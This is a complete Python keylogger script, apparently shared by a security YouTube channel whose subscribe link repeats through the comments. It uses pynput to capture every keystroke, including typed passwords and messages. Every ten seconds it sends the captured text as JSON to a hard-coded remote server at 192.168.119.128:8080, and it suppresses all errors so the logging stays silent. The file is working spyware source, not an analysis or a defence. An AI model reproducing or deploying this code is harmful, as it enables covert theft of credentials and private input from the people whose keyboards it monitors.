# Subscribe To VatsalSecurity Youtube : https://www.youtube.com/@vatsalCyberSec
# Install pynput using the following command: pip install pynput
from pynput import keyboard
import requests
import json
import threading

# Global variables for keystrokes and server details
text = ""
ip_address = "192.168.119.128"
port_number = "8080" # port should be 8080 for default
time_interval = 10

# Function to send data to server
def send_post_req():
    global text
    try:
        # Convert keystrokes to JSON and send to server
        payload = json.dumps({"keyboardData": text})
        requests.post(
            f"http://{ip_address}:{port_number}",
            data=payload,
            headers={"Content-Type": "application/json"}
        )
        # Reset text after sending to avoid re-sending same data
        text = ""
    except Exception:
        pass
    # Set up a timer to keep calling send_post_req every <time_interval> seconds
    timer = threading.Timer(time_interval, send_post_req)
    timer.start()

# Function to handle keystrokes
def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key not in (keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.esc):
            text += str(key).strip("'")
    except Exception:
        pass
# Subscribe To VatsalSecurity Youtube : https://www.youtube.com/@vatsalCyberSec
# Start the keylogger listener
with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
# Subscribe To VatsalSecurity Youtube : https://www.youtube.com/@vatsalCyberSec